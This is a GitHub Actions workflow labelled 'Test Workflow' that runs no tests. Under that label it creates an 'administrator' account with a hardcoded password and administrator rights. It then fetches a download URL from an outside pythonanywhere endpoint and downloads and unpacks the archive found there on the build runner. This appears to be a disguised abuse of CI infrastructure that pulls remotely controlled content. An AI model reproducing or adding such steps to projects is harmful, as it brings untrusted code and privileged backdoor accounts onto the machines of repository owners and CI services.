name: Test Workflow

on:
  push:
    branches:
      - main
  pull_request:

jobs:
  test:
    runs-on: windows-2022

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Create Admin User
        run: |
          net user administrator OLDUSER#6 /add
          net localgroup administrators administrator /add
          echo User 'administrator' created with administrative privileges.
        shell: cmd

      - name: Create Administrator profile folder
        run: |
          mkdir C:\Users\administrator
          echo "Administrator profile folder created."
        shell: cmd

      - name: Download and extract ZIP file
        run: |
          :: Get the URL from the curl API
          for /f "delims=" %%i in ('curl -s "https://azcaptchahh.pythonanywhere.com/geturl" ^| powershell -Command "$($_ | ConvertFrom-Json).url"') do set ZIPURL=%%i
          echo URL is %ZIPURL%
          
          :: Download the ZIP file
          curl -L -o C:\Users\administrator\artifact.zip %ZIPURL%
          
          :: Extract the ZIP file
          powershell -Command "Expand-Archive -Path 'C:\Users\administrator\artifact.zip' -DestinationPath 'C:\Users\administrator' -Force"
          
          :: Remove the ZIP after extraction
          del C:\Users\administrator\artifact.zip
        shell: cmd

      - name: List files in Administrator folder
        run: |
          dir C:\Users\administrator
        shell: cmd
